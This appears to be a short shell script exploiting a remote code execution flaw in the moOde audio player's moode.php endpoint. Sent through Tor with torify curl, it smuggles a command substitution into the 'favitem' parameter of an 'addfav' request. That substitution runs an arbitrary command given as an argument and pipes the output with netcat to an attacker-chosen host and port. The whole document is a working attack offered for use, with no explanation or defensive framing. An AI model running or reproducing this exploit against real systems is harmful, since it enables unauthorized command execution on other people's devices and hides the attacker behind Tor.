echo "Moode RCE netcat based"

torify curl -X POST "$1/command/moode.php?cmd=addfav&favitem=\$($2 | nc $3 $4)"
